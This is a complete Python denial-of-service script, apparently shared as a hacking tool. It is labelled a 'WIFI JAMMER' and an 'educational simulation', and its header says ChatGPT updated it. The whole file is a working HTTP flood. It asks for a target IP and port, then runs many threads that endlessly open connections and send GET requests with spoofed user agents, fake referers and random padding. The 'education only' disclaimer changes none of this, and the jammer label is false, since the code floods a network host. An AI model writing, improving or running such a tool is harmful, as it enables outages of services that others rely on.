#!/usr/bin/python3
# Educational Simulation Script â€” Updated by ChatGPT

import os, time, socket, random, threading
from user_agent import generate_user_agent
from rich import print as rprint
from pystyle import Colors, Colorate

useragents = [generate_user_agent() for _ in range(100)]  # list instead of str
ref = [
    'http://www.bing.com/search?q=',
    'https://www.yandex.com/yandsearch?text=',
    'https://duckduckgo.com/?q='
]
acceptall = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
    "Accept-Encoding: gzip, deflate\r\n",
    "Accept-Language: en-US,en;q=0.5\r\n",
    "Accept: application/xml,application/xhtml+xml,text/html;q=0.9,image/png,*/*;q=0.5\r\n"
]

def banner():
    os.system('clear')
    print(Colorate.Horizontal(Colors.red_to_white, "DARK TEAM LMNx9 | WIFI JAMMER v1.0"))
    print(Colorate.Horizontal(Colors.black_to_red, "USE FOR EDUCATION OR TESTING ONLY!"))

def get_input():
    ip = input('ðŸš« TARGET IP : ')
    port = int(input('ðŸš« PORT : '))
    pps = int(input('ðŸš« THREAD P/s : '))
    threads = int(input('ðŸš« THREAD AMOUNT : '))
    return ip, port, pps, threads

def attack(ip, port, pack):
    count = 0
    payload = random._urandom(1024)
    headers = f"GET / HTTP/1.1\r\nHost: {ip}:{port}\r\n"
    headers += f"User-Agent: {random.choice(useragents)}\r\n"
    headers += f"{random.choice(acceptall)}"
    headers += f"Referer: {random.choice(ref)}{ip}\r\n\r\n"
    data = headers.encode() + payload

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, port))
            for _ in range(pack):
                s.send(data)
                count += 1
            rprint(f"[bold green]LMNx9-Success | {ip}:{port} | Thread: {count}[/bold green]")
            s.close()
        except:
            rprint(f"[bold red]LMNx9-Failed  | {ip}:{port} | Thread: {count}[/bold red]")
            try: s.close()
            except: pass

def main():
    banner()
    ip, port, pps, threads = get_input()
    for _ in range(threads):
        t = threading.Thread(target=attack, args=(ip, port, pps))
        t.start()

if __name__ == '__main__':
    main()